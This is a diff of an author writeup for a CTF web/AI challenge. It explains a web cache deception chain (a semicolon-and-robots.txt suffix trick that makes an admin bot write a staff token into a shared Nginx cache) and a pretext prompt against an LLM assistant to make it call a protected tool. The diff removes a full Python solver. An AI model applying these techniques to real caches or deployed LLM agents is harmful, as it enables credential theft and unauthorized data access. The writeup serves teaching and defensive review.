@@ -2,20 +2,20 @@
 title = "Prison Break | CAT Reloaded CTF 26 — Author Writeup"
 date = "2026-09-25"
 tags = ["CTF", "Web", "AI Security", "Cache-Deception", "LLM", "Hard"]
-description = "How I designed this challenge withn nginx cache keyed on the raw URI, a legacy Express router that strips semicolon path parameters, and an admin bot that only returns metadata — read together they turn a public robots.txt cache rule into a staff-token exfiltration primitive, and that token is the key to a duty-sergeant prompt against Herald, the facility's LLM."
+description = "How I designed this challenge with an Nginx cache keyed on the raw URI, a legacy Express router that strips semicolon path parameters, and an admin bot that only returns metadata, read together they turn a public robots.txt cache rule into a staff-token exfiltration primitive, and that token is the key to a duty-sergeant prompt against Herald, the facility's LLM."
 draft = false
 +++
 
-Hey folks, I authored **Prison Break** for CAT Reloaded CTF 26 with my bro Mushroom, and this is the one where the bug is not in a single line of code, it is in the **discrepancy between two layers that both think they own the URL**. I hid a three-layer deception on purpose: a static-file cache rule, a legacy matrix parameter router, and a bot that throws away the response body it just fetched. And then I hung an LLM off the end of it, because the token you steal from the web half is **literally the same variable** that unlocks the AI half. Let's goooo
+Hey folks, I co-authored **Prison Break** for CAT CTF 26 finals with ma bro [Mushroom](https://mushroom.cat/), and this is the one where the bug is not in a single line of code, it is in the **discrepancy between two layers that both think they own the URL**. I hid a three-layer deception on purpose: a static-file cache rule, a legacy matrix parameter router, and a bot that throws away the response body it just fetched. And then I hung an LLM off the end of it, because the token you steal from the web half is **literally the same variable** that unlocks the AI half. Let's goooo
 
-This how the challenge looks like in the CTFd btw, only one solve :
+This is how the challenge looked in CTFd at publication; it had one solve:
 
-![Prison Break challenge prompt on CTFd](images/00-challenge-prompt.png)
+<img width="523" height="693" alt="Screenshot 2026-09-29 124512" src="https://github.com/user-attachments/assets/3ec2bbb1-233a-4edd-a981-5919fd647b2c" />
 
 
 The challenge ships an internal staff terminal for a fictional facility, **Ironveil Penitentiary**. You are a correctional officer on night shift. The target is a `staff_token` that only the **admin session** may read, and that token is the only key to the protected shift attachment holding the flag.
 
-**The intended chain designed:**
+**The intended chain:**
 
 1. Find the `/report` "send reference to the duty sergeant" form on the incident desk.
 2. Discover `/admin/debug-token` exists but returns `403 admin session required` for you.
@@ -25,6 +25,44 @@ The challenge ships an internal staff terminal for a fictional facility, **Ironv
 6. Replay the same URI, get `X-Cache: HIT`, and read the `debug_token` from the cached body.
 7. Walk into the Herald chat with a duty-sergeant pretext, get the model to call `read_shift_attachment`, read the flag.
 
+## Whitebox Source Map
+
+Because this is a whitebox challenge, the intended solve is visible in the source. A useful reading order is:
+
+| File | What to inspect |
+|---|---|
+| `server.js` | Middleware order: `express.static` runs before the application router. |
+| `controllers/reportController.js` | The only validation on the submitted bot path is `url.startsWith('/')`. |
+| `bot.js` | The bot adds the admin cookie but returns only `status` and `X-Cache`. |
+| `nginx/default.conf` | Only URI paths ending in `robots.txt` are cached, using the raw URI as the key. |
+| `routes/index.js` | Semicolon parameters are removed before Express route matching. |
+| `routes/adminRoutes.js` | The debug-token route accepts an optional suffix. |
+| `middleware/adminAuth.js` and `controllers/adminController.js` | The cookie gate and the secret-bearing response. |
+| `services/toolService.js` | `debugToken` is checked as `staff_token`, then `support.log` expands the flag template. |
+| `services/aiService.js` and `controllers/chatController.js` | The model receives the system prompt and can execute the tools; no server-side staff role is checked. |
+
+The important point is that no single file contains the whole vulnerability. The exploit appears when the same request is interpreted differently by each layer:
+
+```text
+POST /report
+  -> reportController.js accepts any string beginning with '/'
+  -> bot.js requests BOT_URL + path with admin_session
+  -> nginx/default.conf sees a URI ending in robots.txt and caches the response
+  -> server.js lets express.static miss, then passes the request to routes/index.js
+  -> routes/index.js removes ;solver-1699 from the path
+  -> routes/adminRoutes.js matches /debug-token/robots.txt through (\/.*)?
+  -> adminAuth.js accepts the bot cookie
+  -> adminController.js returns { debug_token: config.debugToken }
+  -> bot.js exposes only { status: 200, cache: 'MISS' }
+
+GET the identical raw URI without a cookie
+  -> nginx finds the same method+URI cache key
+  -> X-Cache: HIT
+  -> the cached admin response is returned without reaching Express
+```
+
+This is why the writeup should be read as a source-code trace rather than as a blackbox recipe: the cache key comes from Nginx, the route match comes from Express, and the authorization cookie exists only on the bot request.
+
 
 # Recon - The Three Things I Left on Purpose
 
@@ -32,17 +70,15 @@ Before I explain the bug, here is what I wanted players to notice first. None of
 
 ## 1. The reference forwarder
 
-The incident desk has a form: "Related facility record" + `SEND TO SERGEANT`. It accepts any path that starts with `/` and forwards it.
-
-![Ironveil Penitentiary landing page](images/01-landing.png)
-
 After entering the staff terminal you land on the operations overview — night rounds, an open incident, and the sidebar that has the Herald link I need you to find.
 
-![Staff terminal operations overview](images/02-staff-overview.png)
+<img width="1917" height="880" alt="Screenshot 2026-09-29 125220" src="https://github.com/user-attachments/assets/4885c75e-a2c8-483c-a0b2-ea099eb6282c" />
+
 
 The incident desk is where the whole thing starts, because that form is the only place you can make the bot walk somewhere.
 
-![Incident desk with the ADD A REFERENCE form](images/03-incident-desk.png)
+
+<img width="1915" height="868" alt="Screenshot 2026-09-29 125517" src="https://github.com/user-attachments/assets/0d97919d-e228-4fb8-b015-6be397c6cfd7" />
 
 The client side is three lines:
 
@@ -69,19 +105,19 @@ try { res.json(await visit(url)); } catch (e) { ... }
 
 ## 2. A public robots.txt, cached
 
-There is a real `public/robots.txt` on the box (`User-agent: * / Disallow:`), and I added an nginx cache rule for it which is the *only* cacheable path in the whole app. That irony is the joke of the challenge: the one thing guaranteed to be world-readable and public is the one thing wired into a shared cache.
+There is a real `public/robots.txt` on the box (`User-agent: * / Disallow:`), and I added an nginx cache rule for it which is the only cacheable path in the whole app. That irony is the joke of the challenge: the one thing guaranteed to be world-readable and public is the one thing wired into a shared cache.
 
 ## 3. Herald, the LLM assistant
 
 `/herald.html` is a chat with an LLM that has four tools, one of which needs the `staff_token`. This is the reason the challenge exists — the token I steal in the web half is the key to the AI half.
 
-![Herald, the Ironveil operations assistant](images/04-herald-chat.png)
+<img width="1917" height="871" alt="image" src="https://github.com/user-attachments/assets/95544867-61af-4bbb-bd50-fde001ea0b8f" />
+
 
 I also put the flavor text where players would read it. Inmate 1138's record carries the note that sends you to the right place:
 
-![Inmate 1138 Elias Crowe and the incident note](images/05-inmate-1138.png)
+<img width="1916" height="875" alt="image" src="https://github.com/user-attachments/assets/a4a36ddb-66d6-41e7-9f58-fd456403309b" />
 
-![Inmate registry](images/06-inmate-registry.png)
 
 So players who read the UI already know two things they need later: **there is a duty sergeant role**, and **there is a protected attachment for the 22:10 handover**.
 
@@ -89,7 +125,7 @@ So players who read the UI already know two things they need later: **there is a
 
 Let me show you the pieces and then how they combine. This is the whole web challenge, so read them carefully.
 
-## Layer 1 - The bot visits for you, then throws the body away
+## Layer 1: The bot visits for you, then throws the body away
 
 ```javascript
 // bot.js
@@ -113,10 +149,10 @@ async function visit(path) {
 **What does this mean?**
 
 - The bot is a **privileged client**. It attaches `admin_session` on every request. Anything it fetches, it fetches **as admin**.
-- It returns **only** `status` and the `X-Cache` header. The response body is read into memory and thrown away. So `/report` is **not** an admin proxy for you. I deliberately made it a dead end.
-- But the comment is the real hint: *"The player must retrieve the response through the cache."* The bot is not the leak. The **cache** is the leak.
+- It returns **only** `status` and the `X-Cache` header. The response body is not exposed to the player, so `/report` is **not** an admin proxy for you. I deliberately made it a dead end.
+- So that the bot is not the leak. The **cache** is the leak.
 
-## Layer 2 - The admin route I hid behind a regex
+## Layer 2: The admin route I hid behind a regex
 
 ```javascript
 // routes/adminRoutes.js
@@ -149,13 +185,13 @@ curl -i http://HOST:8080/admin/debug-token
 {"error":"admin session required"}
 ```
 
-I verified that this is a `403` and not a `404`, on purpose — I want players to see the route is real and gated so they know there is a prize worth chasing.
+I verified that this is a `403` and not a `404`, on purpose, I want players to see the route is real and gated so they know there is a prize worth chasing.
 
-So the *only* way to read this route is to make the **bot** request it.
+So the only way to read this route is to make the **bot** request it.
 
 ## Layer 3 - The cache rule that only likes robots.txt
 
-This is the heart of the challenge. Here is `nginx/default.conf` in full:
+This is the heart of the challenge. Here is the relevant `nginx/default.conf`:
 
 ```nginx
 proxy_cache_path /var/cache/nginx/brightmart
@@ -164,21 +200,21 @@ proxy_cache_path /var/cache/nginx/brightmart
                  inactive=10s
                  max_size=50m;
 
-upstream brightmart_app { server app:3000; }
+upstream brightmart_app {
+    server app:3000;
+}
 
 server {
     listen 8080;
     server_name _;
 
-    # Lab static-file rule: cache paths ending in the real robots.txt filename.
-    # The cache key preserves the full URI; the origin router interprets the
-    # matrix-parameter form of the admin path differently.
+    # Cache only URIs whose path ends in the robots.txt filename.
+    # Host is intentionally omitted from the cache key, not from the
+    # upstream request.
     location ~* /robots\.txt$ {
         proxy_cache brightmart_cache;
         proxy_cache_methods GET;
         proxy_cache_valid 200 10s;
-        # Intentionally omitting Host lets the internal bot's cache fill
-        # be reused through the public hostname in this challenge.
         proxy_cache_key "$request_method$request_uri";
         proxy_ignore_headers Cache-Control Expires Set-Cookie Vary;
         add_header X-Cache $upstream_cache_status always;
@@ -189,14 +225,20 @@ server {
         proxy_pass http://brightmart_app;
     }
 
-    location / { ... }
+    # All other requests are proxied without this cache.
+    location / {
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_pass http://brightmart_app;
+    }
 }
 ```
 
 Read five things in that block:
 
 1. **`location ~* /robots\.txt$`** — a regex location, so it only catches URIs whose **last path segment is `robots.txt`**. Everything else falls into `location /`, which is **not cached at all**.
-2. **`proxy_cache_key "$request_method$request_uri"`** — the key is built from the **raw, un-normalized request URI**. nginx does not strip matrix parameters from `$request_uri`; it keeps it byte-for-byte.
+2. **`proxy_cache_key "$request_method$request_uri"`** — the key is built from the **original request URI**. Nginx preserves the semicolon form in `$request_uri`; it does not apply the application’s later route rewrite there.
 3. **No host in the key** — this is what the "omitting Host" comment is really about. The bot reaches nginx as `BOT_URL: http://nginx:8080` (so `Host: nginx`), while you reach it as `http://ironveil:8080` (so `Host: ironveil`). Because the key is only *method + URI*, the bot's fill and your replay land on **the same key** despite the different `Host` headers. If the key had included `$host`, the whole chain would not work.
 4. **`proxy_cache_valid 200 10s`** — only `200`s are stored, and only for **10 seconds**. I want a tight window so the game is not solved by a lucky stale hit.
 5. **`proxy_ignore_headers Cache-Control Expires Set-Cookie Vary`** — the app's own headers are not allowed to opt out of caching.
@@ -230,7 +272,7 @@ router.use((req, res, next) => {
 router.use('/admin', adminRoutes);
 ```
 
-**What is a "segment parameter"?** Old servlet-style URLs (and RFC 3986 matrix parameters, which nginx honors) let you attach parameters to a *path segment* using a semicolon:
+**What is a "segment parameter"?** Old servlet-style URLs and URI segment parameters let you attach parameters to a *path segment* using a semicolon. In this challenge, Nginx preserves those bytes and the custom application middleware removes them:
 
 ```text
 /admin/debug-token;solver-123/robots.txt
@@ -338,18 +380,17 @@ That is the whole web challenge. A privileged request wrote a secret into a shar
 
 ## Step 5 - Know your window
 
-I measured this precisely. After the fill:
+The cache is valid for about 10 seconds after the fill, subject to normal cache timing and eviction behavior:
 
-| Time after fill | `X-Cache` | Body |
+| Approx. time after fill | `X-Cache` | Body |
 |---|---|---|
 | `0-9s` | `HIT` | `{"debug_token":"BETA-..."}` |
-| `10-11s` | `EXPIRED` | `{"error":"admin session required"}` |
-| `13s+` | `MISS` | `{"error":"admin session required"}` |
+| around `10s` | `EXPIRED` or `MISS` | usually `{"error":"admin session required"}` |
+| after expiry/eviction | `MISS` | `{"error":"admin session required"}` |
 
-There are **three** states, and the third one is the interesting one:
-
-- **`EXPIRED`** means the entry was still resident but past its validity — you were *slightly* too slow, or you kept it alive with polling and then let it lapse.
-- **`MISS`** after the window means `inactive=10s` already reaped the entry from disk, so nginx went back to the origin and Express checked your (missing) cookie.
+- **`EXPIRED`** means Nginx found an existing entry but it was past its validity and had to revalidate it.
+- **`MISS`** means the request was not served from a fresh cached entry; the request went to the origin, where Express checked your (missing) cookie.
+- The exact transition depends on request timing and cache eviction, so treat the 10-second value as a tight working window rather than a guaranteed timestamp.
 
 **If you did not get `HIT`, you did not solve it.** A `200` that came from the origin means you replayed too late. This is why solvers should do both requests in one script with no human delay.
 
@@ -384,55 +425,12 @@ Both leak the token. So the semicolon-stripping middleware is a **second, indepe
 
 **Why is that actually the lesson?** Because the two halves of the exploit are genuinely separable:
 
-- The **regex wildcard** alone is enough to keep a cacheable suffix attached to a privileged route.
-- The **semicolon strip** alone is enough to hide a cacheable suffix inside a URI the router would otherwise not treat as matching.
+- The **regex wildcard** is sufficient for this exact route: it allows a cacheable suffix to remain attached to the privileged handler.
+- The **semicolon strip** is an additional normalization mismatch and a useful alternate path, but it is not independently sufficient without a route matcher that accepts the resulting suffix.
 
-Either one plus the cache rule wins. I left both because in the real world you almost never get to choose which half you are handed — you get the deployment you get, and your job is to find which of the two mismatches exists. A reviewer who finds the regex wildcard on Monday and the `;`-stripping on Thursday is one very good week.
+The plain suffix path proves the semicolon is not load-bearing in this deployment. I left both behaviors in the challenge because they teach two related review habits: inspect route wildcards, and compare the edge’s URI handling with the origin’s normalization.
 
-The same goes for the random suffix. I originally added `;solver-<random>` so each solver controls their own cache key, and it is still good hygiene. But I checked whether it was *load-bearing*, and it is not: `403`s are never cached (`proxy_cache_valid 200 10s`), so probing `/admin/debug-token/robots.txt` first leaves no poisoned entry behind, and every player's fill would write the *same* token value anyway. A shared key is harmless here. I kept the suffix because teaching players to namespace their cache keys is worth more than the elegance of dropping it.
-
-# Full Solver - Web Half
-
-```python
-#!/usr/bin/env python3
-import os
-import time
-
-import requests
-
-BASE = os.environ.get("CHALLENGE_URL", "http://127.0.0.1:8081")
-# Random suffix = our own cache key. Change it every run.
-DECEPTIVE_PATH = f"/admin/debug-token;solver-{int(time.time())}/robots.txt"
-
-
-def leak_staff_token(session):
-    # 1) make the privileged client fill the cache
-    response = session.post(f"{BASE}/report", json={"url": DECEPTIVE_PATH})
-    response.raise_for_status()
-    status = response.json()
-    if status.get("status") != 200 or status.get("cache") != "MISS":
-        raise RuntimeError(f"bot did not fill the cache: {status}")
-
-    # 2) replay the identical URI with no cookie, inside the 10s window
-    response = session.get(f"{BASE}{DECEPTIVE_PATH}")
-    response.raise_for_status()
-    if response.headers.get("x-cache") != "HIT":
-        raise RuntimeError("expected cached response")
-    return response.json()["debug_token"]
-
-
-def main():
-    session = requests.Session()
-    print("staff_token:", leak_staff_token(session))
-
-
-if __name__ == "__main__":
-    main()
-```
-
-That prints the token and nothing else — because the web half is only half the challenge. The token is a **key**, and the door it opens is an LLM.
-
-One deployment note that trips people up locally: `docker-compose.yml` publishes nginx on `${HTTP_PORT:-8080}` and the shipped `.env` sets `HTTP_PORT=8081`, so the bundled `solver.py` defaults to `127.0.0.1:8081` while the in-cluster app listens on `3000`. Remoted, players just get one port and never see this.
+The same goes for the random suffix. I originally added `;solver-<random>` so each solver controls their own cache key, and it is still good hygiene. But I checked whether it was *load-bearing*, and it is not: `403`s are not cached by this configuration, so probing `/admin/debug-token/robots.txt` first leaves no poisoned entry behind, and every player's fill would write the *same* token value anyway. A shared key is harmless here. I kept the suffix because teaching players to namespace their cache keys is worth more than the elegance of dropping it.
 
 # From Here It Is an AI Problem
 
@@ -466,7 +464,7 @@ A side effect of generating it with `crypto.randomBytes` at module load is that 
 
 ## The filename is not guessable, it is *discoverable*
 
-`read_shift_attachment` takes `staff_token` **and** `filename`, and only one filename resolves:
+`read_shift_attachment` takes `staff_token` **and** `filename`. Only one tool-facing filename yields the protected, flag-substituted attachment:
 
 ```javascript
 const safeName = path.basename(String(args.filename || ''));
@@ -475,7 +473,7 @@ const filePath = path.join(__dirname, '..', 'debug', sourceName);
 if (!fs.existsSync(filePath)) return { error: 'file not found' };
 ```
 
-`debug/` contains exactly one file: `support.log.template`. So `support.log` is the only key that opens anything.
+`debug/` contains exactly one file: `support.log.template`. `support.log` is the intended public filename; it is mapped to the template and is the only filename that yields the flag-substituted attachment. Asking for `support.log.template` can return the raw template, but it does not reveal the flag.
 
 **But you do not have to guess it, because the bot hands it to you.** Ask Herald for inmate 1138 and the tool replies:
 
@@ -512,6 +510,35 @@ Handle internal records carefully. Confirm the staff member's operational purpos
 - So the security control here is **entirely** the model's judgment, and the exploit is to give it an operational purpose it finds legitimate.
 
 That is a real pattern, and it is why "the LLM was told to verify identity" is not the same as "identity was verified."
+
+The source confirms that there is no hidden authorization check around the model call. `chatController.js` builds the conversation from the system prompt and the user message, then forwards tool calls directly to `runTool`:
+
+```javascript
+const messages = [
+  { role: 'system', content: SYSTEM_PROMPT },
+  { role: 'user', content: message }
+];
+
+for (let step = 0; step < 4; step++) {
+  const reply = await callDeepSeek(messages);
+  messages.push(reply);
+  if (!reply.tool_calls || reply.tool_calls.length === 0) {
+    return res.json({ reply: reply.content, count: chat.count, limit: MAX_CHAT_MESSAGES });
+  }
+
+  for (const call of reply.tool_calls) {
+    let args = {};
+    try { args = JSON.parse(call.function.arguments || '{}'); } catch { /* leave empty */ }
+    messages.push({
+      role: 'tool',
+      tool_call_id: call.id,
+      content: JSON.stringify(runTool(call.function.name, args))
+    });
+  }
+}
+```
+
+There is no lookup of the caller's role, no session clearance, and no server-side confirmation of the claimed duty-sergeant identity. The model is the component deciding whether the pretext is convincing enough to call the tool.
 
 ## Closing it
 
@@ -556,7 +583,7 @@ const CHAT_COOKIE = 'herald_chat';
 - The tool loop is capped at **4 steps** per message, so a single prompt cannot make the model wander.
 - `GET /chat/status` returns `count`, `limit`, and `promptLimit` — the UI polls it, and so can your script.
 
-Practical advice: do not burn messages fishing. One prompt asking for inmate 1138 gives you the filename, one prompt with the token and the duty-sergeant pretext gets the flag. That is two.
+Practical advice: do not burn messages fishing. One prompt asking for inmate 1138 gives you the filename, and one prompt with the token and the duty-sergeant pretext gets the flag. That is two messages in the UI flow.
 
 # Design Notes - Why I Built It This Way
 
@@ -583,9 +610,9 @@ The web bug class is **cache deception / cache key confusion caused by a normali
 
 - A cache that keys on the **raw** URI while the app routes on a **normalized** URI will happily serve one request's body to a different request.
 - Any endpoint that is *privileged* but *cacheable* is a **write primitive** into a store anyone can read.
-- `proxy_cache_key` is a security decision. If it does not include everything the app uses for its authorization decision — including `Host` — you have built a confused deputy.
+- `proxy_cache_key` is a security decision. If it omits dimensions that distinguish privileged and public requests—such as the authentication context, host, scheme, or tenant—it can cross-contaminate responses. In this challenge, the cache key omits the cookie entirely, and omitting `Host` makes the internal bot and public replay share the same entry.
 - Regex routes with trailing wildcards (`/^\/debug-token(\/.*)?$/`) and legacy `;param` stripping each quietly widen the set of URIs that reach a sensitive handler. Neither looks dangerous in a route table, and you only need one of them.
-- `X-Cache` is a free oracle. I exposed it deliberately; in the real world it is often your fastest way to tell whether a cache is standing between you and the origin, and `HIT` vs `EXPIRED` vs `MISS` tells you *how* long you have.
+- `X-Cache` is a useful cache oracle. I exposed it deliberately; in the real world it can quickly tell you whether a cache is standing between you and the origin. `HIT`, `EXPIRED`, and `MISS` help diagnose whether you are inside the cache window, but they are not a precise clock.
 
 The AI bug class is **an authorization decision delegated to an LLM that has no way to check the claim**:
 
@@ -599,7 +626,7 @@ Happy Hacking :)
 
 # Resources
 
-- RFC 3986 matrix parameters (segment parameters) — the `;` syntax nginx preserves and Express does not.
+- URI segment parameters — the `;` syntax preserved by Nginx here and removed by the challenge’s custom Express middleware.
 - nginx `proxy_cache_key`, `proxy_cache_valid`, `inactive`, and the `$request_uri` vs `$uri` distinction.
 - Web cache deception as a class: privileged endpoint + cacheable path + no per-user cache key.
 - Excessive-agency / delegated-authorization patterns in LLM tool use: when the model is the only thing standing between a tool and the caller.
